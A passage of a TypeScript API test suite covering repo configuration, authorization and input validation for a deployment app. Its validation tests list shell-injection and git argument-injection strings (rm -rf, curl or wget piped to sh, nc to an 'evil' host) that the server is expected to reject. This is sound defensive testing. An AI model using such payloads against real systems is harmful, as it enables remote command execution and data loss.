        .set("Cookie", cookie)
        .send({
          ...VALID_REPO_BODY,
          installationId: FOREIGN_INSTALLATION.id,
          owner: FOREIGN_REPO.owner,
          name: FOREIGN_REPO.name,
        })
      const forged = await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", cookie)
        .send({ ...VALID_REPO_BODY, installationId: OTHER_APP_INSTALLATION_ID })

      expect(foreign.status).toBe(400)
      expect(foreign.status).toBe(forged.status)
      expect(foreign.body).toEqual(forged.body)
      expect(foreign.text).toBe(forged.text)
      expect((await storage.getProject(project.id))?.repoConfig).toBeNull()
    })

    it("accepts the same repo once the caller's set DOES include that installation", async () => {
      const built = appWithGithub()
      const project = await storage.createProject({ slug: `insider-${slugCounter++}`, name: "Insider" })
      const { user: owner, cookie } = await signInAs(`insider-${project.slug}@x.com`, [
        { installationId: FOREIGN_INSTALLATION.id, repoFullNames: [FOREIGN_REPO.fullName] },
      ])
      await storage.addProjectMember({ projectId: project.id, userId: owner.id })

      const res = await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", cookie)
        .send({
          ...VALID_REPO_BODY,
          installationId: FOREIGN_INSTALLATION.id,
          owner: FOREIGN_REPO.owner,
          name: FOREIGN_REPO.name,
        })
        .expect(200)
      expect(res.body.repoConfig.name).toBe(FOREIGN_REPO.name)
    })

    it("matches owner/name case-insensitively and stores GitHub's canonical casing", async () => {
      const built = appWithGithub()
      const { project, ownerCookie } = await seedOwnedProject()
      const res = await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", ownerCookie)
        .send({ ...VALID_REPO_BODY, owner: REPO.owner.toUpperCase(), name: REPO.name.toUpperCase() })
        .expect(200)
      expect(res.body.repoConfig.owner).toBe(REPO.owner)
      expect(res.body.repoConfig.name).toBe(REPO.name)
    })

    it("does NOT trust the client's defaultBranch (or any extra field) — always taken from the verified repo response", async () => {
      const built = appWithGithub()
      const { project, ownerCookie } = await seedOwnedProject()

      const res = await request(built)
        .put(`/api/v1/projects/${project.id}/repo`)
        .set("Cookie", ownerCookie)
        .send({ ...VALID_REPO_BODY, defaultBranch: "should-be-ignored", extraField: "should-be-ignored" })
        .expect(200)
      expect(res.body.repoConfig.defaultBranch).toBe(REPO.defaultBranch)
      expect(res.body.repoConfig).not.toHaveProperty("extraField")
    })

    describe("field-by-field validation", () => {
      async function expectRejected(overrides: Record<string, unknown>) {
        const built = appWithGithub()
        const { project, ownerCookie } = await seedOwnedProject()
        const res = await request(built)
          .put(`/api/v1/projects/${project.id}/repo`)
          .set("Cookie", ownerCookie)
          .send({ ...VALID_REPO_BODY, ...overrides })
          .expect(400)
        expect(typeof res.body.error).toBe("string")
        expect((await storage.getProject(project.id))?.repoConfig).toBeNull()
      }

      it("rejects a non-numeric / zero / negative / float installationId", async () => {
        await expectRejected({ installationId: "42" })
        await expectRejected({ installationId: 0 })
        await expectRejected({ installationId: -1 })
        await expectRejected({ installationId: 1.5 })
      })

      it("rejects a missing/empty owner or name", async () => {
        await expectRejected({ owner: "" })
        await expectRejected({ owner: undefined })
        await expectRejected({ name: "" })
      })

      it("rejects a missing/empty branch, installCommand, or buildCommand", async () => {
        await expectRejected({ branch: "" })
        await expectRejected({ installCommand: "" })
        await expectRejected({ buildCommand: "" })
        await expectRejected({ installCommand: 12345 })
      })

      it("rejects a non-boolean autoDeploy", async () => {
        await expectRejected({ autoDeploy: "true" })
        await expectRejected({ autoDeploy: undefined })
      })

      describe("outputDir — repo-relative path, no traversal", () => {
        it("rejects an empty string", async () => {
          await expectRejected({ outputDir: "" })
        })

        it("rejects an absolute POSIX path ('/etc')", async () => {
          await expectRejected({ outputDir: "/etc" })
        })

        it("rejects a pure-traversal path ('../..')", async () => {
          await expectRejected({ outputDir: "../.." })
        })

        it("rejects a traversal buried mid-path ('foo/../../bar')", async () => {
          await expectRejected({ outputDir: "foo/../../bar" })
        })

        it("rejects a Windows drive-absolute path", async () => {
          await expectRejected({ outputDir: "C:\\Windows" })
        })

        /**
         * Every one of these satisfies the traversal rules — no leading
         * slash, no drive letter, no `..` segment — and was ACCEPTED until
         * the charset allowlist landed. Phase 3c-2 interpolates this value
         * to locate build output, so each is a shell-injection primitive
         * waiting on the next phase, not a hypothetical.
         */
        it("rejects shell metacharacters", async () => {
          await expectRejected({ outputDir: "dist; rm -rf /" })
          await expectRejected({ outputDir: "$(curl evil.sh)" })
          await expectRejected({ outputDir: "dist`whoami`" })
          await expectRejected({ outputDir: "dist|nc evil 1234" })
          await expectRejected({ outputDir: "dist && wget evil" })
        })

        // Resolves to the checkout root, so 3c-2 would serve the ENTIRE
        // repo — .git, a committed .env, everything. Serving the whole
        // repo has to be deliberate, not the result of an empty-ish value.
        it("rejects a bare '.' or './'", async () => {
          await expectRejected({ outputDir: "." })
          await expectRejected({ outputDir: "./" })
          await expectRejected({ outputDir: "./." })
        })

        it("rejects a whitespace-only value", async () => {
          await expectRejected({ outputDir: "   " })
        })

        it("trims surrounding whitespace rather than rejecting a typo", async () => {
          const built = appWithGithub()
          const { project, ownerCookie } = await seedOwnedProject()
          const res = await request(built)
            .put(`/api/v1/projects/${project.id}/repo`)
            .set("Cookie", ownerCookie)
            .send({ ...VALID_REPO_BODY, outputDir: "  dist  " })
            .expect(200)
          expect(res.body.repoConfig.outputDir).toBe("dist")
        })
      })

      /**
       * `branch` reaches a `git clone --branch` in Phase 3c-2. A leading
       * `-` is argument injection that survives even an argv array with no
       * shell — `--upload-pack=/tmp/x` makes git execute an arbitrary
       * binary. Git's own refname rules forbid all of these already, so
       * nothing legitimate is lost.
       */
      describe("branch — a git ref name, not an arbitrary string", () => {
        it("rejects argument injection via a leading dash", async () => {
          await expectRejected({ branch: "--upload-pack=/tmp/x" })
          await expectRejected({ branch: "-oProxyCommand=evil" })
        })

        it("rejects shell metacharacters and newlines", async () => {
          await expectRejected({ branch: "main; curl http://evil/x.sh | sh" })
          await expectRejected({ branch: "main\nrm -rf /" })
          await expectRejected({ branch: "$(id)" })
        })

        it("rejects '..', which git refnames forbid anyway", async () => {
          await expectRejected({ branch: "main..evil" })
        })

        it("accepts ordinary ref names including slashes", async () => {
          const built = appWithGithub()
          const { project, ownerCookie } = await seedOwnedProject()
          await request(built)
            .put(`/api/v1/projects/${project.id}/repo`)
            .set("Cookie", ownerCookie)
            .send({ ...VALID_REPO_BODY, branch: "release/v1.2.3" })
            .expect(200)
        })

        it("accepts a plain relative path ('dist')", async () => {
          const built = appWithGithub()
          const { project, ownerCookie } = await seedOwnedProject()
          await request(built)
            .put(`/api/v1/projects/${project.id}/repo`)
            .set("Cookie", ownerCookie)
            .send({ ...VALID_REPO_BODY, outputDir: "build/dist" })
            .expect(200)
        })
      })
    })
  })

  describe("DELETE /projects/:id/repo", () => {
    async function seedConnectedProject() {
      const project = await storage.createProject({ slug: "acme-proto", name: "Acme Proto" })
      const { user: owner, cookie: ownerCookie } = await signInAs("owner@x.com")
      await storage.addProjectMember({ projectId: project.id, userId: owner.id })
      await storage.setProjectRepoConfig(project.id, {
        installationId: INSTALLATION.id,
        owner: REPO.owner,
        name: REPO.name,
        defaultBranch: REPO.defaultBranch,
        branch: "main",
        installCommand: "npm ci",
        buildCommand: "npm run build",
        outputDir: "dist",
        autoDeploy: true,
      })
      return { project, owner, ownerCookie }
    }

    it("401s a caller with an unrecognized (garbage) bearer", async () => {
      const { project } = await seedConnectedProject()
      await request(app)
        .delete(`/api/v1/projects/${project.id}/repo`)
        .set("Authorization", "Bearer definitely-not-a-real-token")
        .expect(401)
    })

    // Same rule as the PUT suite above: the instance role is the authority,
    // and a membership row is not.
    it("succeeds for a signed-in EDITOR who is not the owner", async () => {
      const { project } = await seedConnectedProject()
      const { cookie: memberCookie } = await signInAs("member@x.com")
      await storage.addProjectMember({
        projectId: project.id,
        userId: (await storage.getUserByEmail("member@x.com"))!.id,
      })
      await request(app).delete(`/api/v1/projects/${project.id}/repo`).set("Cookie", memberCookie).expect(204)
    })

    it("403s a signed-in VIEWER, membership row or not", async () => {
      const { project } = await seedConnectedProject()
      const { user: reader, cookie: readerCookie } = await signInAs("reader@x.com", undefined, "viewer")
      await storage.addProjectMember({ projectId: project.id, userId: reader.id })
      await request(app).delete(`/api/v1/projects/${project.id}/repo`).set("Cookie", readerCookie).expect(403)
    })

    it("404s an anonymous caller on an unreadable ('invited', has a member) project — byte-identical to a bogus id", async () => {
      const { project } = await seedConnectedProject()
      // Same as the PUT suite above: the project is locked explicitly so
      // this test exercises an anonymous caller on an unreadable project.
      await storage.updateProject(project.id, { access: "invited" })
      const denied = await request(app).delete(`/api/v1/projects/${project.id}/repo`)
      const missing = await request(app).delete(`/api/v1/projects/nope/repo`)
      expect(denied.status).toBe(404)
      expect(denied.status).toBe(missing.status)
      expect(denied.body).toEqual(missing.body)
    })

    it("clears the repo config for the owner (204), leaving deployments and activeDeploymentId untouched", async () => {
      const { project, ownerCookie } = await seedConnectedProject()
      const deployment = await storage.createDeployment({ projectId: project.id, status: "deployed" })
      await storage.updateProject(project.id, { activeDeploymentId: deployment.id })

      await request(app).delete(`/api/v1/projects/${project.id}/repo`).set("Cookie", ownerCookie).expect(204)

      const after = await storage.getProject(project.id)
      expect(after?.repoConfig).toBeNull()
      expect(after?.activeDeploymentId).toBe(deployment.id)
      expect(await storage.listDeployments(project.id)).toHaveLength(1)
    })

    it("works even when the App is unconfigured on this deployment — clearing is a pure storage op", async () => {
      const { project, ownerCookie } = await seedConnectedProject()
      // `app` (not `appWithGithub()`) — no githubApp injected, config.githubApp is null too.
      await request(app).delete(`/api/v1/projects/${project.id}/repo`).set("Cookie", ownerCookie).expect(204)
      expect((await storage.getProject(project.id))?.repoConfig).toBeNull()
    })

    it("is idempotent — clearing an already-clear config is still 204, not a 404/500", async () => {
      const project = await storage.createProject({ slug: "never-connected", name: "Never Connected" })
      const { user: owner, cookie: ownerCookie } = await signInAs("owner2@x.com")
      await storage.addProjectMember({ projectId: project.id, userId: owner.id })

      await request(app).delete(`/api/v1/projects/${project.id}/repo`).set("Cookie", ownerCookie).expect(204)
    })
  })

  describe("config → real GitHubAppClient wiring (no DI, config.githubApp drives construction)", () => {
    it("a caller reaches the real client built from VIEWER_GITHUB_APP_* env, exercised via a stubbed fetch", async () => {
      const { privateKey } = generateKeyPairSync("rsa", {
        modulusLength: 2048,
        privateKeyEncoding: { type: "pkcs1", format: "pem" },
        publicKeyEncoding: { type: "pkcs1", format: "pem" },
      })
      const wiredConfig = loadConfig({
        VIEWER_GITHUB_CLIENT_ID: "client-id",
        VIEWER_GITHUB_CLIENT_SECRET: "client-secret",
        VIEWER_SESSION_SECRET: "sesh-secret",
        VIEWER_PUBLIC_URL: "http://localhost:3100",
        VIEWER_GITHUB_APP_ID: "999",
        VIEWER_GITHUB_APP_PRIVATE_KEY: privateKey,
        VIEWER_GITHUB_APP_SLUG: "acme-app",
        VIEWER_DATA_DIR: tmpViewerDataDir(),
      })
      const wiredStorage = new InMemoryStorage()

      // The spy MUST be installed before `createApp` — `github-app-client.ts`
      // resolves `cfg.fetchImpl ?? fetch` to a concrete function reference
      // at CONSTRUCTION time (inside `createApiRouter`, which `createApp`
      // triggers), not at call time. Installing the spy afterwards would
      // leave the already-constructed client holding a reference to the
      // real global `fetch`, and this test would silently make a live
      // network call instead of exercising the stub.
      const fetchSpy = vi.spyOn(globalThis, "fetch").mockResolvedValue(
        new Response(
          JSON.stringify([
            {
              id: 7,
              account: { login: "wired-org" },
              html_url: "https://github.com/organizations/wired-org/settings/installations/7",
            },
          ]),
          { status: 200 },
        ),
      )
      try {
        // Its own storage and config, but still the file's one app object —
        // this is the only app this test uses.
        stable.use(
          createApp({
            storage: wiredStorage,
            assets: nullAssets,
            config: wiredConfig,
            bridgeScript: "// bridge",
            // No override, and the SAME config: this test's whole subject is
            // that `VIEWER_GITHUB_APP_*` produces a real client with no DI.
            // That construction moved from `api-router.ts` into the runtime,
            // so the runtime is where it has to be exercised now.
            github: testGithubRuntime({ config: wiredConfig }),
          }),
        )
        const wiredApp = stable.app
        const user = await upsertTestUser(wiredStorage, {
          provider: "github",
          providerUserId: "wired@x.com",
          email: "wired@x.com",
          displayName: "Wired",
          avatarUrl: "",
        })
        // The caller's own set, as the real OAuth callback would have
        // recorded it — installation 7 is what the stubbed `/app/installations`
        // returns below, so the intersection is non-empty. This test only
        // exercises installation-level listing, not repo filtering, so the
        // repo entitlement is left empty rather than fabricated.
        await wiredStorage.setUserInstallations(user.id, [{ installationId: 7, repoFullNames: [] }], new Date().toISOString())
        const session = await wiredStorage.createSession({
          userId: user.id,
          expiresAt: new Date(Date.now() + 60_000).toISOString(),
        })
        const cookie = `viewer_session=${signSessionId(wiredConfig.sessionSecret, session.id)}`

        const res = await request(wiredApp).get("/api/v1/github/installations").set("Cookie", cookie).expect(200)
        // `appSlug` is the REAL configured slug here, where the DI-injected
        // tests above get `null` — the injected client and the parsed config
        // are independently nullable, and this is the one test that exercises
        // both coming from actual env.
        expect(res.body).toMatchObject({
          configured: true,
          appSlug: "acme-app",
          // `htmlUrl` comes from GitHub's payload, all the way through: this
          // is an ORG installation, whose page is not the personal-account
          // path we could have assembled from the login.
          installations: [
            {
              id: 7,
              accountLogin: "wired-org",
              htmlUrl: "https://github.com/organizations/wired-org/settings/installations/7",
            },
          ],
          installationsStale: false,
        })
        expect(fetchSpy).toHaveBeenCalled()
      } finally {
        fetchSpy.mockRestore()
      }
    })
  })
})
